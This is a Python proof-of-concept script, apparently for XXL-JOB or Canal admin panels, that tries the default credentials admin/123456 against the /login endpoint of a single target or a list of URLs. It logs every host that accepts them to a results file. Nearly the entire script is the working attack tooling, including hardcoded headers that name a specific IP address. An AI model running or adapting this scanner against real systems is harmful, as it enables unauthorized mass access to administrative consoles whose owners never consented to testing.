# -*- coding: utf-8 -*-
import argparse, sys, requests

requests.packages.urllib3.disable_warnings()


def banner():
    test = """
          
    ___  _ _     _              _  ____  ____ 
    \  \/// \   / \            / |/  _ \/  __\
     \  / | |   | |   _____    | || / \|| | //
     /  \ | |_/\| |_/\\____\/\_| || \_/|| |_\\
    /__/\\\____/\____/      \____/\____/\____/
                                        tag: XLL-JOB poc                                       
                                        @version: 1.0.0   @author: qs                      
    """
    print(test)

def poc(target):
    url = target + "/login"
    headers = {"Accept": "*/*", "X-Requested-With": "XMLHttpRequest",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36",
               "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "http://39.106.74.241",
               "Referer": "http://39.106.74.241/toLogin", "Accept-Encoding": "gzip, deflate",
               "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    data = {"userName": "admin", "password": "123456"}
    try:
        res = res = requests.post(url, headers=headers, data=data, timeout=5).text
        if '"code":200' in res:
            print(f"[+] {target} is valueable [admin : 123456]")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target + "\n")
        else:
            print(f"[-] {target} is not ")
    except:
        print(f"[*] {target} error")


def main():
    banner()
    parser = argparse.ArgumentParser(description='canal admin weak Password')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))

        for j in url_list:
            poc(j)
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == "__main__":
    # banner()
    main()